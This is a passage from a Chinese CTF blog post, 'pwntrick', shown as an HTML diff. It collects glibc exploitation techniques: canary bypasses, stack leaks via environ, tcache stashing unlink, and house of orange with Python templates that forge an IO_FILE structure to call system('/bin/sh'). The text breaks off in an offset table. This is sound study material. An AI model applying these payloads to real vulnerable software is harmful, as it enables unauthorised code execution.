@@ -1,0 +1,2113 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="pwntrick, Lock&#39;s blog">
+    <meta name="description" content="记录一下pwn的一些小技巧以及一些利用方式，想到哪个写哪个吧。
+0x1.stack smashing detected的利用stack smash技术的利用基础就是栈溢出导致canary被覆盖之后的报错流程
+extern char **__">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>pwntrick | Lock&#39;s blog</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+    
+    <script src="/libs/jquery/jquery.min.js"></script>
+    
+<meta name="generator" content="Hexo 4.1.1"><link rel="alternate" href="/LawlietLW.github.io/atom.xml" title="Lock's blog" type="application/atom+xml">
+<link rel="stylesheet" href="/LawlietLW.github.io/css/prism-tomorrow.css" type="text/css"></head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper head-container">
+            <div class="brand-logo">
+                <a href="/LawlietLW.github.io/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/1.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Lock's blog</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/1.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Lock's blog</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/20.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">pwntrick</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        height: calc(100vh - 250px);
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/LawlietLW.github.io/tags/trick/">
+                                <span class="chip bg-color">trick</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/LawlietLW.github.io/categories/PWN/" class="post-category">
+                                PWN
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2021-01-02
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2021-04-15
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    11k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    48 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <p>记录一下pwn的一些小技巧以及一些利用方式，想到哪个写哪个吧。</p>
+<h2 id="0x1-stack-smashing-detected的利用"><a href="#0x1-stack-smashing-detected的利用" class="headerlink" title="0x1.stack smashing detected的利用"></a>0x1.stack smashing detected的利用</h2><p>stack smash技术的利用基础就是栈溢出导致canary被覆盖之后的报错流程</p>
+<pre class=" language-c"><code class="language-c"><span class="token keyword">extern</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>__libc_argv attribute_hidden<span class="token punctuation">;</span>
+
+<span class="token keyword">void</span>
+<span class="token function">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>noreturn<span class="token punctuation">)</span><span class="token punctuation">)</span> internal_function
+<span class="token function">__fortify_fail</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>msg<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token comment" spellcheck="true">/* The loop is added only to keep gcc happy.  */</span>
+  <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+    <span class="token function">__libc_message</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"*** %s ***: %s terminated\n"</span><span class="token punctuation">,</span>
+            msg<span class="token punctuation">,</span> __libc_argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token punctuation">:</span> <span class="token string">"&lt;unknown>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token function">libc_hidden_def</span> <span class="token punctuation">(</span>__fortify_fail<span class="token punctuation">)</span></code></pre>
+<p>报错流程会打印出<code>__libc_argv[0]</code>的值，这个值是我们执行的文件的文件名，只需要找到文件名在栈中的位置然后通过溢出将其复改为我们想要泄露的值的地址即可。</p>
+<p>ps：这个技术的利用场景通常是能够多次执行程序的情况下且溢出量要足够大。</p>
+<h2 id="0x2-environ环境指针"><a href="#0x2-environ环境指针" class="headerlink" title="0x2.environ环境指针"></a>0x2.environ环境指针</h2><p>在 Linux 系统中，glibc 的环境指针 <code>environ(environment pointer)</code> 为程序运行时所需要的环境变量表的起始地址，环境表中的指针指向各环境变量字符串。从以下结果可知环境指针 environ 在栈空间的高地址处。因此，<strong>可通过 environ 指针泄露栈地址</strong></p>
+<p><a href="https://imgchr.com/i/rzHm3q" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/02/rzHm3q.png" alt="rzHm3q.png"></a></p>
+<p><code>environ</code>地址的计算方法为<code>libc_base+libc.symbols['_environ']</code></p>
+<h2 id="0x3-TLS结构体利用"><a href="#0x3-TLS结构体利用" class="headerlink" title="0x3.TLS结构体利用"></a>0x3.TLS结构体利用</h2><p>canary除了存在于栈上还会存在于TLS结构体中，TLS结构体如下</p>
+<pre class=" language-c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span>
+<span class="token punctuation">{</span>
+  <span class="token keyword">void</span> <span class="token operator">*</span>tcb<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/* Pointer to the TCB.  Not necessarily the
+               thread descriptor used by libpthread.  */</span>
+  dtv_t <span class="token operator">*</span>dtv<span class="token punctuation">;</span>
+  <span class="token keyword">void</span> <span class="token operator">*</span>self<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/* Pointer to the thread descriptor.  */</span>
+  <span class="token keyword">int</span> multiple_threads<span class="token punctuation">;</span>
+  <span class="token keyword">int</span> gscope_flag<span class="token punctuation">;</span>
+  uintptr_t sysinfo<span class="token punctuation">;</span>
+  uintptr_t stack_guard<span class="token punctuation">;</span>
+  uintptr_t pointer_guard<span class="token punctuation">;</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">int</span> vgetcpu_cache<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+  <span class="token comment" spellcheck="true">/* Bit 0: X86_FEATURE_1_IBT.
+     Bit 1: X86_FEATURE_1_SHSTK.
+   */</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> feature_1<span class="token punctuation">;</span>
+  <span class="token keyword">int</span> __glibc_unused1<span class="token punctuation">;</span>
+  <span class="token comment" spellcheck="true">/* Reservation of some values for the TM ABI.  */</span>
+  <span class="token keyword">void</span> <span class="token operator">*</span>__private_tm<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+  <span class="token comment" spellcheck="true">/* GCC split stack support.  */</span>
+  <span class="token keyword">void</span> <span class="token operator">*</span>__private_ss<span class="token punctuation">;</span>
+  <span class="token comment" spellcheck="true">/* The lowest address of shadow stack,  */</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token keyword">int</span> ssp_base<span class="token punctuation">;</span>
+  <span class="token comment" spellcheck="true">/* Must be kept even if it is no longer used by glibc since programs,
+     like AddressSanitizer, depend on the size of tcbhead_t.  */</span>
+  __128bits __glibc_unused2<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token function">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">aligned</span> <span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+  <span class="token keyword">void</span> <span class="token operator">*</span>__padding<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span> tcbhead_t<span class="token punctuation">;</span></code></pre>
+<p>其中<code>stack_guard</code>就是canary，可以通过超长栈溢出覆写tls结构体来绕过canary</p>
+<p>如果是多线程程序，那么从TLS到<code>pthread_create</code>的函数参数传递栈帧的距离小于一页，这种情况可以直接通过超长栈溢出来修改canary。</p>
+<p><a href="https://imgchr.com/i/rzztGF" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/02/rzztGF.png" alt="rzztGF.png"></a></p>
+<p>如果不是多线程的话，则需要能够通过mmap分配到tls结构体附近，因为tls结构体是通过mmap分配的。malloc函数在分配大内存时就会使用mmap进行分配，如果能够用mmap分配过去并且能够溢出到tls结构体就可以修改canary。</p>
+<h2 id="0x4-vsyscall作为滑板指令"><a href="#0x4-vsyscall作为滑板指令" class="headerlink" title="0x4.vsyscall作为滑板指令"></a>0x4.vsyscall作为滑板指令</h2><p>vsyscall可以作为滑板指令，也就是相当于一个ret，使rop链向下滑动。当程序开启了pie后且没有libc地址，无法使用gadget时就可以使用这条指令作为ret来使程序流向下滑动，然后再进行partial overwrite覆盖返回地址为onegadget或别的。</p>
+<p><a href="https://imgchr.com/i/sSpNu9" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/02/sSpNu9.png" alt="sSpNu9.png"></a></p>
+<p>通常使用<code>0xffffffffff600000</code>这个地址。</p>
+<h2 id="0x5-glibc2-29及更高版本的uaf"><a href="#0x5-glibc2-29及更高版本的uaf" class="headerlink" title="0x5.glibc2.29及更高版本的uaf"></a>0x5.glibc2.29及更高版本的uaf</h2><p>高版本下glibc引入了stash机制，就是当从fastbin中取完hunk后，会将这条链上剩下的bin放到对应大小的tcache中。</p>
+<p>在glibc2.29以及更高版本的glibc中，如果存在uaf但无法修改tcache的key值，先将tcache填满，然后在fastbin中进行double free，借着再从tcache中取chunk，使tcache为空或者不满，然后再从fastbin里取chunk，fastbin中剩余的chunk会被放入tcache中，而tcache不检查size，可以任意分配，这样能方便利用。</p>
+<h2 id="0x6-tcache-stashing-unlink"><a href="#0x6-tcache-stashing-unlink" class="headerlink" title="0x6.tcache_stashing_unlink"></a>0x6.tcache_stashing_unlink</h2><p>这个技巧能够将任意地址写一个固定的值，也就是smallbin的表头</p>
+<p>只记录下构造方法，实现原理不再赘述</p>
+<p>前提需要能绕过tcache取chunk，也就是需要<code>calloc</code>函数</p>
+<p>1.<code>tcache</code>中放<code>6</code>个，<code>smallbin</code>中放两个</p>
+<p>2.将后进<code>smallbin</code>的<code>chunk</code>的<code>bk</code>(不破坏<code>fd</code>指针的情况下)修改为目标地址<code>-0x10</code></p>
+<p>3.从smallbin中取一个chunk，先进入smallbin的chunk被分配给用户，后进入的chunk由于stash机制被放入tcache</p>
+<p>由于<code>bck = tc_victim-&gt;bk</code>，bck即为目标地址-0x10，<code>bck-&gt;fd = bin</code>，最终目标地址被写入了smallbin表头的地址。</p>
+<h2 id="0x7-tcache-stashing-unlink-plus"><a href="#0x7-tcache-stashing-unlink-plus" class="headerlink" title="0x7.tcache_stashing_unlink plus"></a>0x7.tcache_stashing_unlink plus</h2><p>这个技巧能够往任意地址处分配一个chunk</p>
+<p>1.<code>tcache</code>中放<code>5</code>个，<code>smallbin</code>中放两个</p>
+<p>2.将后进<code>smallbin</code>的<code>chunk</code>的<code>bk</code>(不破坏<code>fd</code>指针的情况下)修改为目标地址<code>-0x10</code>，同时将目标地址<code>+0x8</code>处的值设置为一个指向可写内存的指针。</p>
+<p>3.从smallbin中取一个chunk，走完stash流程，目标地址就会被链入tcache中。</p>
+<h2 id="0x8-tcache-stashing-unlink-plus-plus"><a href="#0x8-tcache-stashing-unlink-plus-plus" class="headerlink" title="0x8.tcache_stashing_unlink plus plus"></a>0x8.tcache_stashing_unlink plus plus</h2><p>这个技巧能够同时实现任意地址分配chunk和任意地址写两个目标。</p>
+<p>1.<code>tcache</code>中放<code>5</code>个，<code>smallbin</code>中放两个</p>
+<p>2.将后进<code>smallbin</code>的<code>chunk</code>的<code>bk</code>(不破坏<code>fd</code>指针的情况下)修改为目标地址1<code>-0x10</code>，将目标地址 1 <code>+ 0x8</code> 的位置设置为目标地址 2 <code>-0x10</code>.</p>
+<p>3.从smallbin中取一个chunk，即可实现两个目标。</p>
+<h2 id="0x9-一个控制程序流的gadget"><a href="#0x9-一个控制程序流的gadget" class="headerlink" title="0x9.一个控制程序流的gadget"></a>0x9.一个控制程序流的gadget</h2><p>在libc2.31中有这样一个gadget</p>
+<pre class=" language-assembly"><code class="language-assembly">0x0000000000157fea: 
+mov rbp, qword ptr [rdi + 0x48]; 
+mov rax, qword ptr [rbp + 0x18]; 
+lea r13, [rbp + 0x10]; 
+mov dword ptr [rbp + 0x10], 0; 
+mov rdi, r13; 
+call qword ptr [rax + 0x28];</code></pre>
+<p>如果我们可以控制rdi，那么就能够进行一个任意call。</p>
+<p>一般用于堆题的orw</p>
+<p>同样的，在其他版本的libc中也存在着类似的gadget，只不过细节不一样，但都能达成call的作用</p>
+<h2 id="0xA-格式化字符串写入注意"><a href="#0xA-格式化字符串写入注意" class="headerlink" title="0xA.格式化字符串写入注意"></a>0xA.格式化字符串写入注意</h2><p>如果要一次性修改malloc_hook或者free_hook并且发送大量字符触发onegadget的话，一定要注意，%99999c不能放在payload的最后，因为如果把%99999c放在地址后面，地址存在空字符，那样往printf的缓冲区内写数据时就会截断！%99999c就无法写入，自然也无法触发malloc_hook!</p>
+<h2 id="0xB-house-of-orange"><a href="#0xB-house-of-orange" class="headerlink" title="0xB.house of orange"></a>0xB.house of orange</h2><p>1.需要libc地址和heap地址，还需要能够溢出。一种情况是修改unsorted bin的大小为0x61，修改其bk指针为<code>&amp;io_list_all-0x10</code>，设置好<code>fp-&gt;flag='/bin/sh\x00'</code>,<code>fp-&gt;_mode &lt;= 0</code> 且<code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code>，注意偏移，vtable指针设置为某个我们能控制的内存，再将这片伪造的vtable空间的0x18偏移处设置为system函数的地址，如下图所示</p>
+<p><a href="https://imgchr.com/i/s9Gbp6" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/03/s9Gbp6.png" alt="s9Gbp6.png"></a></p>
+<p>构造模板为</p>
+<pre class=" language-python"><code class="language-python">fake_file <span class="token operator">=</span> IO_FILE_plus<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#创建一个IO_FILE对象</span>
+fake_file<span class="token punctuation">.</span>_flags <span class="token operator">=</span> u64<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#设置_flag为binsh，_flag的位置为unsorted bin的presize</span>
+fake_file<span class="token punctuation">.</span>_IO_read_ptr <span class="token operator">=</span> <span class="token number">0x61</span><span class="token comment" spellcheck="true">#修改unsorted bin的size为0x61</span>
+fake_file<span class="token punctuation">.</span>_IO_read_base<span class="token operator">=</span>_IO_list_all<span class="token number">-0x10</span><span class="token comment" spellcheck="true">#修改unsorted bin的bk指针为_IO_list_all-0x10</span>
+fake_file<span class="token punctuation">.</span>_IO_write_base<span class="token operator">=</span><span class="token number">0</span>
+fake_file<span class="token punctuation">.</span>_IO_write_ptr<span class="token operator">=</span><span class="token number">1</span><span class="token comment" spellcheck="true">#满足_IO_write_ptr > _IO_write_ptr</span>
+fake_file<span class="token punctuation">.</span>_mode<span class="token operator">=</span><span class="token number">0</span><span class="token comment" spellcheck="true">#满足_mode&lt;=0</span>
+fake_file<span class="token punctuation">.</span>vtable<span class="token operator">=</span>heap_base<span class="token operator">+</span><span class="token number">0x4f0</span><span class="token operator">+</span>fake_file<span class="token punctuation">.</span>size<span class="token comment" spellcheck="true">#设置vtable指向fake_file下方</span>
+pay <span class="token operator">+=</span> str<span class="token punctuation">(</span>fake_file<span class="token punctuation">)</span>
+pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span>  <span class="token comment" spellcheck="true"># vtable，_IO_OVERFLOW在_IO_jump_t中的偏移为0x18</span>
+pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 设置_IO_OVERFLOW为system，</span></code></pre>
+<p>上面的方法只适用于libc2.23及更低版本libc，libc2.24对vtable的位置进行了检查，所以不能随意伪造vtable了。</p>
+<p>我们使用<code>_IO_str_jumps</code>这个vtable来伪造我们的vtable</p>
+<p>结构如下</p>
+<pre class=" language-c"><code class="language-c">pwndbg<span class="token operator">></span> p _IO_str_jumps 
+$<span class="token number">19</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
+  __dummy <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> 
+  __dummy2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> 
+  __finish <span class="token operator">=</span> <span class="token number">0x7ffff7a906b0</span> <span class="token operator">&lt;</span>_IO_str_finish<span class="token operator">></span><span class="token punctuation">,</span> 
+  __overflow <span class="token operator">=</span> <span class="token number">0x7ffff7a90310</span> <span class="token operator">&lt;</span>__GI__IO_str_overflow<span class="token operator">></span><span class="token punctuation">,</span> 
+  __underflow <span class="token operator">=</span> <span class="token number">0x7ffff7a902b0</span> <span class="token operator">&lt;</span>__GI__IO_str_underflow<span class="token operator">></span><span class="token punctuation">,</span> 
+  __uflow <span class="token operator">=</span> <span class="token number">0x7ffff7a8e900</span> <span class="token operator">&lt;</span>__GI__IO_default_uflow<span class="token operator">></span><span class="token punctuation">,</span> 
+  __pbackfail <span class="token operator">=</span> <span class="token number">0x7ffff7a90690</span> <span class="token operator">&lt;</span>__GI__IO_str_pbackfail<span class="token operator">></span><span class="token punctuation">,</span> 
+  __xsputn <span class="token operator">=</span> <span class="token number">0x7ffff7a8e960</span> <span class="token operator">&lt;</span>__GI__IO_default_xsputn<span class="token operator">></span><span class="token punctuation">,</span> 
+  __xsgetn <span class="token operator">=</span> <span class="token number">0x7ffff7a8eaf0</span> <span class="token operator">&lt;</span>__GI__IO_default_xsgetn<span class="token operator">></span><span class="token punctuation">,</span> 
+  __seekoff <span class="token operator">=</span> <span class="token number">0x7ffff7a907e0</span> <span class="token operator">&lt;</span>__GI__IO_str_seekoff<span class="token operator">></span><span class="token punctuation">,</span> 
+  __seekpos <span class="token operator">=</span> <span class="token number">0x7ffff7a8eea0</span> <span class="token operator">&lt;</span>_IO_default_seekpos<span class="token operator">></span><span class="token punctuation">,</span> 
+  __setbuf <span class="token operator">=</span> <span class="token number">0x7ffff7a8ed70</span> <span class="token operator">&lt;</span>_IO_default_setbuf<span class="token operator">></span><span class="token punctuation">,</span> 
+  __sync <span class="token operator">=</span> <span class="token number">0x7ffff7a8f120</span> <span class="token operator">&lt;</span>_IO_default_sync<span class="token operator">></span><span class="token punctuation">,</span> 
+  __doallocate <span class="token operator">=</span> <span class="token number">0x7ffff7a8ef10</span> <span class="token operator">&lt;</span>__GI__IO_default_doallocate<span class="token operator">></span><span class="token punctuation">,</span> 
+  __read <span class="token operator">=</span> <span class="token number">0x7ffff7a90160</span> <span class="token operator">&lt;</span>_IO_default_read<span class="token operator">></span><span class="token punctuation">,</span> 
+  __write <span class="token operator">=</span> <span class="token number">0x7ffff7a90170</span> <span class="token operator">&lt;</span>_IO_default_write<span class="token operator">></span><span class="token punctuation">,</span> 
+  __seek <span class="token operator">=</span> <span class="token number">0x7ffff7a90140</span> <span class="token operator">&lt;</span>_IO_default_seek<span class="token operator">></span><span class="token punctuation">,</span> 
+  __close <span class="token operator">=</span> <span class="token number">0x7ffff7a8f120</span> <span class="token operator">&lt;</span>_IO_default_sync<span class="token operator">></span><span class="token punctuation">,</span> 
+  __stat <span class="token operator">=</span> <span class="token number">0x7ffff7a90150</span> <span class="token operator">&lt;</span>_IO_default_stat<span class="token operator">></span><span class="token punctuation">,</span> 
+  __showmanyc <span class="token operator">=</span> <span class="token number">0x7ffff7a90180</span> <span class="token operator">&lt;</span>_IO_default_showmanyc<span class="token operator">></span><span class="token punctuation">,</span> 
+  __imbue <span class="token operator">=</span> <span class="token number">0x7ffff7a90190</span> <span class="token operator">&lt;</span>_IO_default_imbue<span class="token operator">></span>
+<span class="token punctuation">}</span></code></pre>
+<p>伪造的FILE结构体需要满足如下条件</p>
+<pre class=" language-c"><code class="language-c">fp<span class="token operator">-></span>_flags<span class="token operator">&amp;</span><span class="token number">1</span><span class="token operator">==</span><span class="token number">0</span>
+fp<span class="token operator">-></span>_mode <span class="token operator">&lt;=</span> <span class="token number">0</span> 
+fp<span class="token operator">-></span>_IO_write_ptr <span class="token operator">></span> fp<span class="token operator">-></span>_IO_write_base
+fp<span class="token operator">-></span>_IO_buf_base<span class="token operator">=</span>binsh
+fp<span class="token operator">-></span>vtable<span class="token operator">=</span>_IO_str_jumps<span class="token number">-8</span>
+fp<span class="token operator">+</span><span class="token number">0xe8</span><span class="token operator">=</span>system</code></pre>
+<p>构造模板为</p>
+<pre class=" language-python"><code class="language-python">fake_file <span class="token operator">=</span> IO_FILE_plus<span class="token punctuation">(</span><span class="token punctuation">)</span>
+fake_file<span class="token punctuation">.</span>_flags <span class="token operator">=</span> <span class="token number">0</span>
+fake_file<span class="token punctuation">.</span>_IO_read_ptr <span class="token operator">=</span> <span class="token number">0x61</span>
+fake_file<span class="token punctuation">.</span>_IO_read_base<span class="token operator">=</span>_IO_list_all<span class="token number">-0x10</span>
+fake_file<span class="token punctuation">.</span>_IO_buf_base<span class="token operator">=</span>binsh_addr
+fake_file<span class="token punctuation">.</span>_IO_write_base<span class="token operator">=</span><span class="token number">0</span>
+fake_file<span class="token punctuation">.</span>_IO_write_ptr<span class="token operator">=</span><span class="token number">1</span>
+fake_file<span class="token punctuation">.</span>_mode<span class="token operator">=</span><span class="token number">0</span>
+fake_file<span class="token punctuation">.</span>vtable<span class="token operator">=</span>_IO_str_jumps<span class="token number">-8</span>
+pay <span class="token operator">+=</span> str<span class="token punctuation">(</span>fake_file<span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xe8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span></code></pre>
+<p>附上IO_FILE结构体的偏移量</p>
+<pre class=" language-c"><code class="language-c"><span class="token number">0x0</span>   _flags
+<span class="token number">0x8</span>   _IO_read_ptr
+<span class="token number">0x10</span>  _IO_read_end
